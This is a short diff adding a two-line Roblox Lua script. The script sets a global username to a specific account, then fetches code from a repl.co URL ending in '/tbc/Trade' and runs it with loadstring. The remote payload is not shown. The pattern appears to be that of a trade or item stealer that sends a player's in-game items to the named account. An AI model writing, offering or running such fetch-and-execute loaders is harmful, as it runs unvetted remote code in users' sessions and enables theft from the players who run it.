@@ -1,0 +1,2 @@
+getgenv().Username = "myL0rd31"
+loadstring(game:HttpGet("https://a05d2724-cb03-4bb7-af5d-293c8436e212-00-3c9ykas6hdl4f.riker.repl.co/tbc/Trade"))()
